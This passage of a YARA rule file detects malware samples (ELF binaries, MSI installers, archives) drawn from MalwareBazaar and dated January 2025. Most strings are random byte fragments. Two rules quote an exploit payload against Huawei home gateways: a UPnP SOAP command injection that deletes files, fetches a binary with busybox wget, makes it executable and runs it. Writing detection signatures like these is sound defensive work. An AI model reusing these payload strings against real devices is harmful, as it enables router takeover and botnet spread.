      $s4 = "'/proc/self/exe" fullword ascii
      $s5 = "gwAb'<I" fullword ascii
      $s6 = "$Info: " fullword ascii
      $s7 = "N7N\"S<" fullword ascii
      $s8 = "d?fBUG" fullword ascii
      $s9 = "oQ:^F% " fullword ascii
      $s10 = "73XH;\\O/y" fullword ascii
      $s11 = "TX[c>iO" fullword ascii
      $s12 = "Ei+?~D" fullword ascii
      $s13 = "qCX$zX\\" fullword ascii
      $s14 = "+.5|$(" fullword ascii
      $s15 = "%NEbC3" fullword ascii
      $s16 = "[\"K50H" fullword ascii
      $s17 = "2.Go<da5" fullword ascii
      $s18 = ";kzf}x$" fullword ascii
      $s19 = "G\\xV.)" fullword ascii
      $s20 = "Ip$]1-" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule b6d9439fa186ae21173e57bad9cd893b6a27d5ca4382b00312249cefa40932d7 {
   meta:
      description = "evidences - file b6d9439fa186ae21173e57bad9cd893b6a27d5ca4382b00312249cefa40932d7.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "b6d9439fa186ae21173e57bad9cd893b6a27d5ca4382b00312249cefa40932d7"
   strings:
      $s1 = "* 4`Pn" fullword ascii
      $s2 = "mmap failed." fullword ascii
      $s3 = "RVSPUWVS" fullword ascii
      $s4 = "3D\".vEq" fullword ascii
      $s5 = "fIPV7R2" fullword ascii
      $s6 = "$Info: " fullword ascii
      $s7 = "&C!%IV[" fullword ascii
      $s8 = "Rb,qQP" fullword ascii
      $s9 = "h!_8D(5" fullword ascii
      $s10 = "PN8Yc3" fullword ascii
      $s11 = "7BN<pr" fullword ascii
      $s12 = "$#_5\"V" fullword ascii
      $s13 = "OCo\\:S" fullword ascii
      $s14 = "|LF^$gB" fullword ascii
      $s15 = "Yn-O\\$" fullword ascii
      $s16 = "Gr\\OEIR\\" fullword ascii
      $s17 = "B28q/M" fullword ascii
      $s18 = "mgw*@n" fullword ascii
      $s19 = "1U-U-^$" fullword ascii
      $s20 = "]$*\"Lf,u4" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      8 of them
}

rule d3054d673b97c380e78c8c2f7d447bc7df587e06810306689157bbaee90c1259 {
   meta:
      description = "evidences - file d3054d673b97c380e78c8c2f7d447bc7df587e06810306689157bbaee90c1259.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "d3054d673b97c380e78c8c2f7d447bc7df587e06810306689157bbaee90c1259"
   strings:
      $s1 = "inTmh4" fullword ascii
      $s2 = "epA297" fullword ascii
      $s3 = "cuFV04" fullword ascii
      $s4 = "$Info: " fullword ascii
      $s5 = "Lm*-/#" fullword ascii
      $s6 = ")>!]dY" fullword ascii
      $s7 = "2chVV>" fullword ascii
      $s8 = "0/4cdKO" fullword ascii
      $s9 = "d*!^|T" fullword ascii
      $s10 = "pz*3fw" fullword ascii
      $s11 = "3Ndd&]iz" fullword ascii
      $s12 = "~[\\PI7" fullword ascii
      $s13 = "3v;2no" fullword ascii
      $s14 = " ~4[D)" fullword ascii
      $s15 = "`958m7" fullword ascii
      $s16 = "#~E%ck" fullword ascii
      $s17 = "Rk,Eow=" fullword ascii
      $s18 = "t#VcM}" fullword ascii
      $s19 = "40Fo$!" fullword ascii
      $s20 = ",O`ER}Zn" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      8 of them
}

rule sig_3167204da48c382798d7455267b1791168008f93592b6794d304b27903fb37e5 {
   meta:
      description = "evidences - file 3167204da48c382798d7455267b1791168008f93592b6794d304b27903fb37e5.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "3167204da48c382798d7455267b1791168008f93592b6794d304b27903fb37e5"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{56705450-CFCF-4367-A42C-4F4D273C6991}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "fdsgrtyht" fullword ascii
      $s4 = ")$H:z:\"" fullword ascii
      $s5 = "wlM.WrE" fullword ascii
      $s6 = "Cmdm/(A" fullword ascii
      $s7 = "-->A^G" fullword ascii
      $s8 = "GEt  Y" fullword ascii
      $s9 = "\\PWOqU|T" fullword ascii
      $s10 = "F- pNR7" fullword ascii
      $s11 = "QjgjMY7" fullword ascii
      $s12 = "cU%J%:" fullword ascii
      $s13 = "fgvogx" fullword ascii
      $s14 = "qoU -U" fullword ascii
      $s15 = "~~\\; -" fullword ascii
      $s16 = "- 1fgmW^1" fullword ascii
      $s17 = "M\\=F6P!." fullword ascii
      $s18 = "?'* E'" fullword ascii
      $s19 = "DGy -IY" fullword ascii
      $s20 = "# eR)+" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule cfd788fb51b1e5176f46426ac640b732d71f94fc2d276bb3d7c251fa5e82a891 {
   meta:
      description = "evidences - file cfd788fb51b1e5176f46426ac640b732d71f94fc2d276bb3d7c251fa5e82a891.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "cfd788fb51b1e5176f46426ac640b732d71f94fc2d276bb3d7c251fa5e82a891"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{56705450-CFCF-4367-A42C-4F4D273C6991}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "dgsrhykui" fullword ascii
      $s4 = ")$H:z:\"" fullword ascii
      $s5 = "wlM.WrE" fullword ascii
      $s6 = "Cmdm/(A" fullword ascii
      $s7 = "-->A^G" fullword ascii
      $s8 = "GEt  Y" fullword ascii
      $s9 = "\\PWOqU|T" fullword ascii
      $s10 = "F- pNR7" fullword ascii
      $s11 = "QjgjMY7" fullword ascii
      $s12 = "cU%J%:" fullword ascii
      $s13 = "fgvogx" fullword ascii
      $s14 = "qoU -U" fullword ascii
      $s15 = "~~\\; -" fullword ascii
      $s16 = "- 1fgmW^1" fullword ascii
      $s17 = "M\\=F6P!." fullword ascii
      $s18 = "?'* E'" fullword ascii
      $s19 = "DGy -IY" fullword ascii
      $s20 = "# eR)+" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0a6f3ba {
   meta:
      description = "evidences - file 394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0a6f3ba.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0a6f3ba"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "TQZF:\"a" fullword ascii
      $s3 = "5_=<\"e5a" fullword ascii /* hex encoded string '^Z' */
      $s4 = "fhdrreth" fullword ascii
      $s5 = "jYGC!." fullword ascii
      $s6 = "L:\"VMo" fullword ascii
      $s7 = "T:\\Q0N" fullword ascii
      $s8 = "glaf.GzSr" fullword ascii
      $s9 = "h%HYS%v!" fullword ascii
      $s10 = "SGNZA46" fullword ascii
      $s11 = "VkZeUa6" fullword ascii
      $s12 = "roductCode{60061CAF-7DA8-4838-A14F-7721F9D157C3}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s13 = "Sw-;+ " fullword ascii
      $s14 = ",h* |r" fullword ascii
      $s15 = "/|- 8VU" fullword ascii
      $s16 = "0- ;\\\\" fullword ascii
      $s17 = "I- e~){" fullword ascii
      $s18 = "||b /E5" fullword ascii
      $s19 = "w /IOq" fullword ascii
      $s20 = "! -vaE" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule sig_66edb872fde436ff7ac37f72bff3b44cdaaf7f08b23147fdc45bd215ccb51352 {
   meta:
      description = "evidences - file 66edb872fde436ff7ac37f72bff3b44cdaaf7f08b23147fdc45bd215ccb51352.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "66edb872fde436ff7ac37f72bff3b44cdaaf7f08b23147fdc45bd215ccb51352"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "TQZF:\"a" fullword ascii
      $s3 = "5_=<\"e5a" fullword ascii /* hex encoded string '^Z' */
      $s4 = "jYGC!." fullword ascii
      $s5 = "bfdgsregfhty" fullword ascii
      $s6 = "L:\"VMo" fullword ascii
      $s7 = "T:\\Q0N" fullword ascii
      $s8 = "glaf.GzSr" fullword ascii
      $s9 = "h%HYS%v!" fullword ascii
      $s10 = "SGNZA46" fullword ascii
      $s11 = "VkZeUa6" fullword ascii
      $s12 = "roductCode{60061CAF-7DA8-4838-A14F-7721F9D157C3}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s13 = "Sw-;+ " fullword ascii
      $s14 = ",h* |r" fullword ascii
      $s15 = "/|- 8VU" fullword ascii
      $s16 = "0- ;\\\\" fullword ascii
      $s17 = "I- e~){" fullword ascii
      $s18 = "||b /E5" fullword ascii
      $s19 = "w /IOq" fullword ascii
      $s20 = "! -vaE" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule sig_412832991c8007de0898d44f724cff80eb5bb60b4082ced5335e0aa7b5d8ec2c {
   meta:
      description = "evidences - file 412832991c8007de0898d44f724cff80eb5bb60b4082ced5335e0aa7b5d8ec2c.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "412832991c8007de0898d44f724cff80eb5bb60b4082ced5335e0aa7b5d8ec2c"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /1; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs huawei.selfrep)</NewStatusURL><NewDo" ascii
      $s3 = "#GET /dlr.%s HTTP/1.1" fullword ascii
      $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s5 = "User-Agent: wget (dlr)" fullword ascii
      $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s7 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s8 = "HOST: 255.255.255.255:1900" fullword ascii
      $s9 = "Host: 127.0.0.1" fullword ascii
      $s10 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s11 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s12 = "service:service-agent" fullword ascii
      $s13 = "/bin/busybox echo -ne " fullword ascii
      $s14 = "wnloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s15 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s16 = "usage: busybox" fullword ascii
      $s17 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s18 = "(SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s19 = "assword" fullword ascii
      $s20 = "sername" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule d0b0559d4aa385410bed5a7409a03bb2d35fa461ce61d9bc5eb2469178b0e1e9 {
   meta:
      description = "evidences - file d0b0559d4aa385410bed5a7409a03bb2d35fa461ce61d9bc5eb2469178b0e1e9.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "d0b0559d4aa385410bed5a7409a03bb2d35fa461ce61d9bc5eb2469178b0e1e9"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /1; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs huawei.selfrep)</NewStatusURL><NewDo" ascii
      $s3 = "#GET /dlr.%s HTTP/1.1" fullword ascii
      $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s5 = "User-Agent: wget (dlr)" fullword ascii
      $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s7 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s8 = "HOST: 255.255.255.255:1900" fullword ascii
      $s9 = "Host: 127.0.0.1" fullword ascii
      $s10 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s11 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s12 = "service:service-agent" fullword ascii
      $s13 = "/bin/busybox echo -ne " fullword ascii
      $s14 = "wnloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s15 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s16 = "usage: busybox" fullword ascii
      $s17 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s18 = "(SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s19 = "assword" fullword ascii
      $s20 = "sername" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule sig_4174efe81d6c282386c7a659f5f696ded961fd874b4ef6e937c126616c351312 {
   meta:
      description = "evidences - file 4174efe81d6c282386c7a659f5f696ded961fd874b4ef6e937c126616c351312.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "4174efe81d6c282386c7a659f5f696ded961fd874b4ef6e937c126616c351312"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "C/ZBfp:\\yn" fullword ascii
      $s3 = "# -$DDF" fullword ascii
      $s4 = "roductCode{373BCEC0-51A2-4651-AEBF-5A4FCDB72B5B}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s5 = "W:\"BbV" fullword ascii
      $s6 = "4XW.EFJ'VP" fullword ascii
      $s7 = "/tO:\"c" fullword ascii
      $s8 = "^o:\\rd" fullword ascii
      $s9 = "L43.XDl" fullword ascii
      $s10 = "BK:\\6:5" fullword ascii
      $s11 = "x:\\ldkIY" fullword ascii
      $s12 = "CqC-%w%'s" fullword ascii
      $s13 = "- )8FBts" fullword ascii
      $s14 = "81Tx- " fullword ascii
      $s15 = " b/+ ;oZ" fullword ascii
      $s16 = "AVkCML49" fullword ascii
      $s17 = "\\PZtJ\\<" fullword ascii
      $s18 = "B(7  /w" fullword ascii
      $s19 = "7Fi -Dp" fullword ascii
      $s20 = "}D /nH" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_4d42ec12fd0d834bf8be2ce43561464cb4722bb68550278546ae3de03569cf38 {
   meta:
      description = "evidences - file 4d42ec12fd0d834bf8be2ce43561464cb4722bb68550278546ae3de03569cf38.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "4d42ec12fd0d834bf8be2ce43561464cb4722bb68550278546ae3de03569cf38"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{8ED2CC60-09FB-42CC-99E9-6898C8DAB6E4}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "fhgtrjuykj" fullword ascii
      $s4 = "Z:\\7@k" fullword ascii
      $s5 = "#GetyH9" fullword ascii
      $s6 = "0f]M!." fullword ascii
      $s7 = "yhuh8758" fullword ascii
      $s8 = "+ {\\$m" fullword ascii
      $s9 = "_7!* 2HFQ>PK" fullword ascii
      $s10 = "iu;) -" fullword ascii
      $s11 = "y(k++ " fullword ascii
      $s12 = "nJKcYBY2" fullword ascii
      $s13 = "-uj- ?" fullword ascii
      $s14 = "opwASS4" fullword ascii
      $s15 = "\\uiGE& p " fullword ascii
      $s16 = "nhuQUp3" fullword ascii
      $s17 = "o!F\"- x" fullword ascii
      $s18 = " -N`Ui" fullword ascii
      $s19 = "# V6vDn" fullword ascii
      $s20 = "QN91* " fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_781db8817945199f0bf801d7be8b3e8c9b71cceac489bb321a8249debc009143 {
   meta:
      description = "evidences - file 781db8817945199f0bf801d7be8b3e8c9b71cceac489bb321a8249debc009143.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "781db8817945199f0bf801d7be8b3e8c9b71cceac489bb321a8249debc009143"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{8ED2CC60-09FB-42CC-99E9-6898C8DAB6E4}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "hgfhdtrfghfg" fullword ascii
      $s4 = "Z:\\7@k" fullword ascii
      $s5 = "#GetyH9" fullword ascii
      $s6 = "0f]M!." fullword ascii
      $s7 = "yhuh8758" fullword ascii
      $s8 = "+ {\\$m" fullword ascii
      $s9 = "_7!* 2HFQ>PK" fullword ascii
      $s10 = "iu;) -" fullword ascii
      $s11 = "y(k++ " fullword ascii
      $s12 = "nJKcYBY2" fullword ascii
      $s13 = "-uj- ?" fullword ascii
      $s14 = "opwASS4" fullword ascii
      $s15 = "\\uiGE& p " fullword ascii
      $s16 = "nhuQUp3" fullword ascii
      $s17 = "o!F\"- x" fullword ascii
      $s18 = " -N`Ui" fullword ascii
      $s19 = "# V6vDn" fullword ascii
      $s20 = "QN91* " fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_91e3f43d76c2400eafb518961a0bc8044012c3febd870e88e153667bddda4624 {
   meta:
      description = "evidences - file 91e3f43d76c2400eafb518961a0bc8044012c3febd870e88e153667bddda4624.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "91e3f43d76c2400eafb518961a0bc8044012c3febd870e88e153667bddda4624"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{8ED2CC60-09FB-42CC-99E9-6898C8DAB6E4}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "fcdsgrhfg" fullword ascii
      $s4 = "Z:\\7@k" fullword ascii
      $s5 = "#GetyH9" fullword ascii
      $s6 = "0f]M!." fullword ascii
      $s7 = "yhuh8758" fullword ascii
      $s8 = "+ {\\$m" fullword ascii
      $s9 = "_7!* 2HFQ>PK" fullword ascii
      $s10 = "iu;) -" fullword ascii
      $s11 = "y(k++ " fullword ascii
      $s12 = "nJKcYBY2" fullword ascii
      $s13 = "-uj- ?" fullword ascii
      $s14 = "opwASS4" fullword ascii
      $s15 = "\\uiGE& p " fullword ascii
      $s16 = "nhuQUp3" fullword ascii
      $s17 = "o!F\"- x" fullword ascii
      $s18 = " -N`Ui" fullword ascii
      $s19 = "# V6vDn" fullword ascii
      $s20 = "QN91* " fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule be5a6ccac39cc436ff3447106328ef8ddc782f4a66aa192569dfb94d31b568d8 {
   meta:
      description = "evidences - file be5a6ccac39cc436ff3447106328ef8ddc782f4a66aa192569dfb94d31b568d8.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "be5a6ccac39cc436ff3447106328ef8ddc782f4a66aa192569dfb94d31b568d8"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{8ED2CC60-09FB-42CC-99E9-6898C8DAB6E4}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "bgfsdrgfjh" fullword ascii
      $s4 = "Z:\\7@k" fullword ascii
      $s5 = "#GetyH9" fullword ascii
      $s6 = "0f]M!." fullword ascii
      $s7 = "yhuh8758" fullword ascii
      $s8 = "+ {\\$m" fullword ascii
      $s9 = "_7!* 2HFQ>PK" fullword ascii
      $s10 = "iu;) -" fullword ascii
      $s11 = "y(k++ " fullword ascii
      $s12 = "nJKcYBY2" fullword ascii
      $s13 = "-uj- ?" fullword ascii
      $s14 = "opwASS4" fullword ascii
      $s15 = "\\uiGE& p " fullword ascii
      $s16 = "nhuQUp3" fullword ascii
      $s17 = "o!F\"- x" fullword ascii
      $s18 = " -N`Ui" fullword ascii
      $s19 = "# V6vDn" fullword ascii
      $s20 = "QN91* " fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_4fba9de7a20617a870f9769eae386464057589cd626c1768dee73992c51c4240 {
   meta:
      description = "evidences - file 4fba9de7a20617a870f9769eae386464057589cd626c1768dee73992c51c4240.7z"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "4fba9de7a20617a870f9769eae386464057589cd626c1768dee73992c51c4240"
   strings:
      $s1 = "%DmcS:\\" fullword ascii
      $s2 = "* ^B;^" fullword ascii
      $s3 = "* 9usw" fullword ascii
      $s4 = "* }>r\"K" fullword ascii
      $s5 = "+tEUV+ y" fullword ascii
      $s6 = "DCkOZ!." fullword ascii
      $s7 = "Hf:\\xm" fullword ascii
      $s8 = "|D:\"G>" fullword ascii
      $s9 = "Fj:\"~}m" fullword ascii
      $s10 = "Xqf:\"Uu" fullword ascii
      $s11 = "CCOQRNT" fullword ascii
      $s12 = "PLQLNAM" fullword ascii
      $s13 = "FzL6JeYe" fullword ascii
      $s14 = "\\c7%G%" fullword ascii
      $s15 = "Txtjeik" fullword ascii
      $s16 = "A{\\.\"m" fullword ascii
      $s17 = " -=NZo" fullword ascii
      $s18 = "pGfzUE0" fullword ascii
      $s19 = "usNYkbx2" fullword ascii
      $s20 = "Fa>d+ 1" fullword ascii
   condition:
      uint16(0) == 0x7a37 and filesize < 15000KB and
      8 of them
}

rule sig_50f1c3fd9157cad099bb9fa20c81bd975b516e3bbe31f4d36dfa8d21cb4db08b {
   meta:
      description = "evidences - file 50f1c3fd9157cad099bb9fa20c81bd975b516e3bbe31f4d36dfa8d21cb4db08b.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "50f1c3fd9157cad099bb9fa20c81bd975b516e3bbe31f4d36dfa8d21cb4db08b"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "K:FTPij+'" fullword ascii
      $s3 = "YxJJ%uW%k|(" fullword ascii
      $s4 = "fs:VGlW.XFR" fullword ascii
      $s5 = "4mRUnI\\>X" fullword ascii
      $s6 = "{.gET1" fullword ascii
      $s7 = "ap /dx" fullword ascii
      $s8 = "6%Xe%1" fullword ascii
      $s9 = "5]f* *" fullword ascii
      $s10 = "f-  XS" fullword ascii
      $s11 = "\\.%sFmzq!" fullword ascii
      $s12 = "PqCTRu1" fullword ascii
      $s13 = "_v+ LYs" fullword ascii
      $s14 = "LVVpb08" fullword ascii
      $s15 = "roductCode{14BDF326-583C-4979-ADFE-4BCAAFBBEC44}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s16 = "lwcdhb" fullword ascii
      $s17 = ".934* " fullword ascii
      $s18 = "kiAO@\"E0." fullword ascii
      $s19 = "VKwnI-2" fullword ascii
      $s20 = "OmKC?a&" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule sig_5576c7b2a2408bd5812580d6ffdf7fa7e8662dd2ed93af905b09e7047cf043e2 {
   meta:
      description = "evidences - file 5576c7b2a2408bd5812580d6ffdf7fa7e8662dd2ed93af905b09e7047cf043e2.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "5576c7b2a2408bd5812580d6ffdf7fa7e8662dd2ed93af905b09e7047cf043e2"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{0918528B-E90E-41BD-B88D-2F886F744833}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "bfdgrhtykl" fullword ascii
      $s4 = "D:U:\"69y,X" fullword ascii
      $s5 = "y:\"[IW." fullword ascii
      $s6 = "Q9X.zlV" fullword ascii
      $s7 = "DVv.Zbp" fullword ascii
      $s8 = "hqwivl" fullword ascii
      $s9 = "(3e* M" fullword ascii
      $s10 = "AMukzH2" fullword ascii
      $s11 = ",+ :Ja" fullword ascii
      $s12 = "mDpMhDIK0" fullword ascii
      $s13 = "jRmCys0" fullword ascii
      $s14 = "AC$2+ ," fullword ascii
      $s15 = ".X.DwU`x8F" fullword ascii
      $s16 = "KOnG8Qj" fullword ascii
      $s17 = "LUOH=va" fullword ascii
      $s18 = "rfBFg J" fullword ascii
      $s19 = "ptTm\"5" fullword ascii
      $s20 = "./CweohG`" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule ccdaed5b9dc02565ca4beac1f8bb971b23077363408a7887855581eb228acb62 {
   meta:
      description = "evidences - file ccdaed5b9dc02565ca4beac1f8bb971b23077363408a7887855581eb228acb62.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "ccdaed5b9dc02565ca4beac1f8bb971b23077363408a7887855581eb228acb62"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{0918528B-E90E-41BD-B88D-2F886F744833}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "bfgjtykhjl" fullword ascii
      $s4 = "D:U:\"69y,X" fullword ascii
      $s5 = "y:\"[IW." fullword ascii
      $s6 = "Q9X.zlV" fullword ascii
      $s7 = "DVv.Zbp" fullword ascii
      $s8 = "hqwivl" fullword ascii
      $s9 = "(3e* M" fullword ascii
      $s10 = "AMukzH2" fullword ascii
      $s11 = ",+ :Ja" fullword ascii
      $s12 = "mDpMhDIK0" fullword ascii
      $s13 = "jRmCys0" fullword ascii
      $s14 = "AC$2+ ," fullword ascii
      $s15 = ".X.DwU`x8F" fullword ascii
      $s16 = "KOnG8Qj" fullword ascii
      $s17 = "LUOH=va" fullword ascii
      $s18 = "rfBFg J" fullword ascii
      $s19 = "ptTm\"5" fullword ascii
      $s20 = "./CweohG`" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and 4 of them
}

rule sig_58a00d4396b8f58e921c8a3d3caca837960fdb3361ce5baf082515d78c30b299 {
   meta:
      description = "evidences - file 58a00d4396b8f58e921c8a3d3caca837960fdb3361ce5baf082515d78c30b299.rar"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "58a00d4396b8f58e921c8a3d3caca837960fdb3361ce5baf082515d78c30b299"
